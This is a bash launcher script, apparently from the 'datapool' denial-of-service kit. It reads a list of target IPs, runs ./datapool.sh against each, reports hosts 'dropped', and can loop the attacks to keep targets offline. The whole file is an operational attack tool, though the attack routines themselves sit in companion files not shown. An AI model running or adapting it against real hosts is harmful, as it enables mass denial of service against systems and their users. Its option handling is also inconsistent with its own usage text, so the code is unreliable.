#!/bin/bash
if [ ! -f ./ips.txt ]; then
    echo "Please create ./ips.txt with a list of IPs to attack before running."
    exit 1
fi
if [ ! -f ./datapool.fc ]; then
    echo "Dude, wtf were u thinking?? Don't delete datapool.fc dumbass!!!"
    exit 1
fi
. ./datapool.fc

function usage2 {
    echo "Usage: $0 [-i] [source ip] [-v] [logfile] [-p] [portlow-porthigh] "
    echo "[-s] [-l] [T1|T3|OC3|Modem|Slowass] [-x] [-k] [-a] [-t] [# of attacks]"
    echo "[-r] [attackname]"
    echo "Options:"
    echo "[-p]: Specifies port range to scan.  ex: -p 1-1024"
    echo "[-x]: \"Don't stop till they drop\""
    echo "[-v]: Logs results of scan to file.  ex: -v logfile.log"
    echo "[-s]: Scan ports only."
    echo "[-l]: Specifies line speed.  Choose from T1,T3, and Modem."
    echo "[-i]: Specifies source IP.  ex: -i 127.0.0.1"
    echo "[-k]: Wait till host is online, then attack."
    echo "[-a]: Loop attack. (Used with -k and -x can keep a connection dropped.)"
    echo "[-t]: Number of simultaneous attacks to launch. ex: -t 4"
    echo "[-r]: Run this attack only. ex: -r onetwothreefour"
    echo "      Note: attacknames can be found in datapool.fc"
    exit 1
}
LOOPATK=0
while getopts p:v:l:i:xask OPTION ; do
    case "$OPTION" in
    a) LOOPATK=1 ;;
   \?) usage2 ;;
   esac
done
clear

nfo

trap "rm -f ./output.txt ; rm -f ./output2.txt ; rm -rf ./svcname.txt ; ./cleaner.sh ; exit 1" 1 2 3 15
if [ "$LOOPATK" = "0" ]; then
    echo "Beginning attack..."
    while read ATTACKIP
    do
	echo "Attacking $ATTACKIP..."
	./datapool.sh $@ -d $ATTACKIP 1>/dev/null 2>/dev/null
	case $? in
	0) echo "$ATTACKIP was dropped by $LASTATTACK" ;;
	1) echo "There was an error running the script...exiting." ; exit 1 ;;
	2) echo "$ATTACKIP was not avaliable." ;;
	4) echo "The following ports are open on $ATTACKIP:" ; cat ./output.txt ;;
	5) echo "$ATTACKIP was attacked, but is still alive..." ;;
	esac
    done < "./ips.txt"
    echo "Attack completed."
else
    echo "Beginning attack..."
    while true; do
	while read ATTACKIP
	do
	    echo "Attacking $ATTACKIP..."
	    ./datapool.sh $@ -d $ATTACKIP 1>/dev/null 2>/dev/null
	    case $? in
	    0) echo "$ATTACKIP was dropped by $LASTATTACK" ;;
    	    1) echo "There was an error running the script...exiting." ; exit 1 ;;
	    2) echo "$ATTACKIP was not avaliable." ;;
	    4) echo "The following ports are open on $ATTACKIP:" ; cat ./output.txt ;;
	    5) echo "$ATTACKIP was attacked, but is still alive..." ;;
	    esac
	done < "./ips.txt"
    done
    echo "Attack completed."
fi
